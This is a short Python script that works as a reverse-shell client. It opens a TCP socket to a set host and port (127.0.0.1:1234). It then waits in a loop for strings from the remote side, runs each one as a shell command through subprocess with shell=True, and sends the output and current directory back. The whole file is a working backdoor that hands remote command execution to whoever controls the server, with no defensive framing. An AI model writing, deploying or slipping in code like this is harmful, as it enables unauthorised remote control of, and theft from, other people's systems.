import os
import socket
import subprocess
import time


# create a socket
def socket_create():
    try:
        global host
        global port
        global connection
        host = "127.0.0.1"
        port = 1234
        connection = socket.socket()
    except socket.error as sockErr:
        print("Couldn't create socket! "+ str(sockErr))


# connect to a remote socket
def socket_connect():
    try:
        global host
        global port
        global connection
        connection.connect((host, port))
    except socket.error as sockErr:
        print("Couldn't connect to the socket! "+ str(sockErr))


# Receive commands from remote server and run it on local machine
def receive_commands():
    while True:
        data = connection.recv(20480)
        if data[:2].decode("UTF-8") == 'cd':
            try:
                os.chdir(data[3:].decode("UTF-8"))
            except:
                pass
        if data[:].decode("UTF-8") == 'quit':
            connection.close()
            break
        if len(data) > 0:
            try:
                cmd = subprocess.Popen(data[:].decode("UTF-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                output_bytes = cmd.stdout.read() + cmd.stderr.read()
                output_str = str(output_bytes, "UTF-8")
                connection.send(str.encode(output_str + str(os.getcwd()) + ':~$ '))
                print(output_str)
            except:
                output_str = "Command is not recognized\n"
                connection.send(str.encode(output_str + str(os.getcwd()) + ':~$ '))
                print(output_str)
    connection.close()


def main():
    global connection
    try:
        socket_create()
        socket_connect()
        receive_commands()
    except:
        print("Couldn't connect to the server!")

main()